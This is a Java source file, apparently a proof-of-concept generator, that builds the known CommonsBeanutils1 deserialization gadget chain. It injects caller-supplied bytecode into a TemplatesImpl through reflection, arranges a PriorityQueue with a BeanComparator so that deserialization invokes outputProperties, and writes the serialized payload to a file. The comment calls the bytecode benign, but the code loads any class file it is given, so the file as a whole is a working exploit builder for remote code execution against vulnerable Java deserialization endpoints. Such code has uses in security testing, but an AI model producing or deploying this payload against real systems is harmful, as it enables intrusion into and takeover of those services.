import java.io.*;
import java.math.BigInteger;
import java.nio.file.*;
import java.lang.reflect.Field;
import java.util.PriorityQueue;
import org.apache.commons.beanutils.BeanComparator;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

/** Builds the documented CommonsBeanutils1 graph from source with benign bytecode. */
public final class NativePayload {
  private static void field(Object object, String name, Object value) throws Exception {
    Field field = object.getClass().getDeclaredField(name);
    field.setAccessible(true); field.set(object, value);
  }
  @SuppressWarnings({"unchecked", "rawtypes"})
  public static void main(String[] arguments) throws Exception {
    TemplatesImpl templates = new TemplatesImpl();
    field(templates, "_bytecodes", new byte[][]{Files.readAllBytes(Paths.get(arguments[0]))});
    field(templates, "_name", "NativeProof");
    field(templates, "_tfactory", new TransformerFactoryImpl());
    BeanComparator comparator = new BeanComparator("lowestSetBit");
    PriorityQueue<Object> queue = new PriorityQueue<>(2, comparator);
    queue.add(BigInteger.ONE); queue.add(BigInteger.ONE);
    field(comparator, "property", "outputProperties");
    field(queue, "queue", new Object[]{templates, templates});
    try (ObjectOutputStream output = new ObjectOutputStream(new FileOutputStream(arguments[1]))) { output.writeObject(queue); }
  }
}
